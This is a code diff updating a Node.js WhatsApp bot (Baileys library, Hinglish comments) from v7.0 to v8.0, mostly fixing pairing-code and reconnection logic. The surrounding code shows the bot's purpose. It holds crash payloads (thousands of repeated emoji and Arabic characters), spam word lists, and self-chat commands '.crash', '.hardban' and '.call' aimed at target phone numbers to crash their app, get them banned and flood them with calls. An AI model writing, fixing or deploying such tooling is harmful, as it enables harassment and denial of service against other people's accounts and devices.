@@ -1,6 +1,7 @@
 // ============================================
-// WHATSAPP SELF-CHAT BOT v7.0
-// Pairing Code Mode (QR nahi, code dikhega)
+// WHATSAPP SELF-CHAT BOT v8.0
+// FIXED: Connection Closed Error
+// Railway Compatible - Pairing Code + QR
 // ============================================
 
 const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
@@ -8,6 +9,15 @@ const { Boom } = require('@hapi/boom');
 const fs = require('fs');
 const pino = require('pino');
 
+// ============================================
+// 🔴 YE LINE BADALO - APNA NUMBER DAALO
+// ============================================
+const MY_NUMBER = "919876543210";  // ← Apna number yahan likho (country code + number)
+// Example: India 9876543210 → "919876543210"
+// Example: Pakistan 3001234567 → "923001234567"
+// ============================================
+
+// PAYLOADS
 const PAYLOADS = {
     light: "😀".repeat(4000),
     heavy: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1500),
@@ -30,7 +40,6 @@ const SPAM_WORDS = [
 let sock = null;
 let connected = false;
 let ownerJid = null;
-let pairingCodeGenerated = false;
 
 let attack = { running: false, interval: null, target: null, sent: 0, max: 80, delay: 50 };
 let ban = { running: false, interval: null, target: null, sent: 0, round: 0, mode: null };
@@ -66,10 +75,10 @@ async function handleCommand(msg) {
 .call 91XX
 
 ⚙️:
-.delay 30  → Speed
+.delay 30 → Speed
 .count 100 → Msg count
-.stop      → Sab roko
-.status    → Bot status
+.stop → Sab roko
+.status → Bot status
 ` });
         return;
     }
@@ -180,48 +189,51 @@ Delay: ${attack.delay}ms | Count: ${attack.max}` });
 }
 
 // ============================================
-// MAIN BOT
+// 🎯 MAIN BOT WITH FIXED PAIRING CODE
 // ============================================
 async function startBot() {
     console.log("══════════════════════════════════════");
-    console.log("  WHATSAPP SELF-CHAT BOT v7.0");
-    console.log("  Pairing Code Mode");
-    console.log("══════════════════════════════════════");
+    console.log("  WHATSAPP SELF-CHAT BOT v8.0");
+    console.log("  Fix: Connection Closed Error");
+    console.log("══════════════════════════════════════\n");
 
     const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
 
     sock = makeWASocket({
         auth: state,
-        printQRInTerminal: false,  // QR band
-        browser: Browsers.ubuntu('Chrome'),
+        printQRInTerminal: true,
+        browser: ['Chrome (Linux)', '', ''],  // ⚠️ IMPORTANT: Yahi browser kaam karega
         logger: pino({ level: 'silent' }),
         syncFullHistory: false,
+        defaultQueryTimeoutMs: 0,  // ⚠️ IMPORTANT: Connection Closed fix
+        connectTimeoutMs: 60000,
+        keepAliveIntervalMs: 10000,
+        markOnlineOnConnect: false,
     });
 
     sock.ev.on('creds.update', saveCreds);
 
-    // 🎯 YAHAN PARING CODE GENERATE HOGA
+    // Connection events
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update;
 
-        if (qr && !pairingCodeGenerated) {
-            // QR aaya hai, lekin hum pairing code use karenge
-            console.log("\n⚠️ QR code received but using PAIRING CODE instead...");
-            console.log("⚠️ Check logs above for pairing code instructions.");
+        if (qr) {
+            console.log("\n📱 QR CODE (agar pairing code kaam na kare to scan karo):");
+            // QR terminal mein print hoga
         }
 
         if (connection === 'open') {
             connected = true;
             ownerJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
             const num = sock.user.id.split(':')[0];
-            console.log(`\n✅ CONNECTED! Number: ${num}`);
-            console.log(`📝 Ab self-chat mein commands likho`);
+            console.log(`\n✅✅✅ CONNECTED SUCCESSFULLY!`);
+            console.log(`📱 Number: ${num}`);
+            console.log(`📝 Ab self-chat mein commands likho!\n`);
 
             try {
                 await sock.sendMessage(ownerJid, { text: `🤖 Bot Ready!
-                
 Commands self-chat mein likho:
-.help → Commands
+.help → Commands list
 .crash 91XX → Crash
 .hardban 91XX → Ban
 .call 91XX → Call spam` });
@@ -230,20 +242,20 @@ Commands self-chat mein likho:
 
         if (connection === 'close') {
             connected = false;
-            pairingCodeGenerated = false;
             const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
-            console.log(`❌ Disconnected: ${reason}`);
-            console.log("🔄 Reconnecting in 5s...");
-            setTimeout(startBot, 5000);
+            console.log(`\n❌ Disconnected. Reason: ${reason}`);
+            
+            // Agar logged out nahi hai to reconnect
+            if (reason !== DisconnectReason.loggedOut) {
+                console.log("🔄 Reconnecting in 5 seconds...\n");
+                setTimeout(startBot, 5000);
+            } else {
+                console.log("❌ Logged out. Session delete karke dobara deploy karo.");
+            }
         }
     });
 
-    // Jab credentials register ho jayein to pairing code generate karo
-    sock.ev.on('creds.update', () => {
-        // Pehle hi generate ho chuka hai to skip
-    });
-
-    // Messages handle
+    // Messages handle karo
     sock.ev.on('messages.upsert', async (m) => {
         for (const msg of m.messages) {
             if (msg.key && msg.key.fromMe && msg.key.remoteJid === msg.key.participant) {
@@ -252,47 +264,49 @@ Commands self-chat mein likho:
         }
     });
 
-    // ⏳ Wait karo phir pairing code generate karo
-    console.log("\n⏳ Waiting 5 seconds before generating pairing code...");
-    await sleep(5000);
-    
-    try {
-        // 🔥 YEH HAI SOLUTION - Pairing Code
-        // Apna WhatsApp number yahan likho (country code ke saath)
-        const PAIRING_PHONE = "16044090869";  // ← YEH BADALO!
+    // ⏳ WAIT - Socket ko set up hone do, PHIR pairing code generate karo
+    console.log("⏳ Waiting 8 seconds for WebSocket to stabilize...");
+    await sleep(8000);
+
+    // 🔑 PEHLE CHECK - Agar already registered hai to pairing code mat maango
+    if (!sock.authState.creds.registered) {
+        console.log(`\n📱 Generating pairing code for: ${MY_NUMBER}`);
         
-        if (PAIRING_PHONE === "YOUR_NUMBER_HERE") {
-            console.log("\n⚠️ Pehle apna number code mein daalo!");
-            console.log("⚠️ index.js mein 'YOUR_NUMBER_HERE' ko apne number se replace karo");
-            console.log("⚠️ Example: const PAIRING_PHONE = '919876543210';");
-            return;
+        try {
+            const code = await sock.requestPairingCode(MY_NUMBER);
+            
+            console.log("\n══════════════════════════════════════");
+            console.log("  ✅✅ PAIRING CODE GENERATED!");
+            console.log("══════════════════════════════════════");
+            console.log("");
+            console.log(`  📋 CODE: ${code}`);
+            console.log("");
+            console.log("══════════════════════════════════════");
+            console.log("  📌 HOW TO USE:");
+            console.log("  1. Open WhatsApp on your phone");
+            console.log("  2. Go to Settings → Linked Devices");
+            console.log("  3. Tap 'Link a Device'");
+            console.log("  4. Enter this code: ${code}");
+            console.log("══════════════════════════════════════\n");
+            
+        } catch (err) {
+            console.log(`\n❌ Pairing code error: ${err.message}`);
+            console.log("📱 QR code print ho raha hai upar - use scan karo!");
+            console.log("⏳ Bot retry karega automatically...\n");
         }
+    } else {
+        console.log("✅ Already registered and connected!");
+        console.log("📝 Self-chat mein commands likho.\n");
         
-        console.log(`\n📱 Generating pairing code for: ${PAIRING_PHONE}`);
-        const code = await sock.requestPairingCode(PAIRING_PHONE);
-        
-        console.log("\n══════════════════════════════════════");
-        console.log("  ✅ PAIRING CODE GENERATED!");
-        console.log("══════════════════════════════════════");
-        console.log("");
-        console.log(`  📋 CODE: ${code}`);
-        console.log("");
-        console.log("══════════════════════════════════════");
-        console.log("  📌 STEPS:");
-        console.log("  1. Phone mein WhatsApp kholo");
-        console.log("  2. Settings → Linked Devices");
-        console.log("  3. 'Link a Device' par click karo");
-        console.log("  4. Yeh code enter karo: " + code);
-        console.log("══════════════════════════════════════\n");
-        
-        pairingCodeGenerated = true;
-    } catch (err) {
-        console.log("\n❌ Pairing code error:", err.message);
-        console.log("⚠️ Bot auto-retry karega...");
+        // Owner JID set karo agar connected nahi hai
+        if (!connected) {
+            console.log("⏳ Waiting for connection...\n");
+        }
     }
 }
 
 // START
+console.log("\n🚀 Starting bot...\n");
 startBot();
 
 process.on('SIGINT', () => process.exit(0));
